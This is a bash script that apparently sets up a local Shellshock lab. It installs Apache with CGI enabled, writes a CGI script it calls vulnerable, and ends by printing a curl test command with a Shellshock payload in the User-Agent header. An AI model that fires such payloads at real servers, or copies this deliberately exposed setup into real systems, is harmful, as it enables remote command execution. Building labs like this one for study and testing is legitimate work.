#!/bin/bash

# Function to check the previous command
check_command() {
  if [ $? -ne 0 ]; then
    print_message "red" "Error: $1"
    exit 1
  fi
}

# Function to print messages with color
print_message() {
  local color=$1
  local message=$2

  if [ "$color" == "green" ]; then
    echo -e "\n\e[32m[*] $message\e[0m"
  elif [ "$color" == "red" ]; then
    echo -e "\n\e[31m[!] $message\e[0m"
  else
    echo -e "\n$message"
  fi
}

# Function to restore the original Bash
restore_bash() {
  print_message "green" "Restoring the original Bash version"
  if [ -f "/bin/bash.backup" ]; then
    sudo mv /bin/bash /bin/bash.vulnerable
    sudo mv /bin/bash.backup /bin/bash
    check_command "Failed to restore the original Bash"
    print_message "green" "Original Bash restored successfully"
  else
    print_message "red" "Backup of the original Bash not found. Cannot restore."
  fi
  exit 0
}

# Check if the --restore_bash parameter is passed
if [ "$1" == "--restore_bash" ]; then
  restore_bash
fi

# Instal Apache
print_message "green" "Installing Apache2"
sudo apt install -y apache2

# Enable Apache CGI module
print_message "green" "Enabling Apache CGI module"
sudo a2enmod cgi
sudo systemctl restart apache2

# Configure Apache for CGI
print_message "green" "Configuring Apache for CGI"
CGI_CONF="/etc/apache2/sites-enabled/000-default.conf"
# if grep doesn't find "ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/" => append the following lines to $CGI_CONF
if ! grep -q "ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/" $CGI_CONF; then
    sudo bash -c "cat >> $CGI_CONF" <<EOF

<Directory "/usr/lib/cgi-bin">
    Options +ExecCGI
    AddHandler cgi-script .cgi
    AllowOverride None
    Require all granted
</Directory>

EOF
fi
sudo systemctl restart apache2

# Create a vulnerable CGI script
print_message "green" "Creating a vulnerable CGI script"
VULNERABLE_SCRIPT="/usr/lib/cgi-bin/vulnerable.cgi"
sudo bash -c "cat > $VULNERABLE_SCRIPT" <<'EOF'
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<html><body>"
echo "<h1>Executed command: $QUERY_STRING</h1>"
echo "</body></html>"
EOF
sudo chmod +x $VULNERABLE_SCRIPT

# Check the version of Bash
print_message "green" "Checking the version of Bash"
BASH_VERSION=$(bash --version | head -n 1)
echo "bash version: $BASH_VERSION"

# Suggerimento per il test dell'exploit
print_message "green" "Test the exploit with the following command:"
echo "    curl -H \"User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable'\" http://localhost/cgi-bin/vulnerable.cgi?query=test"
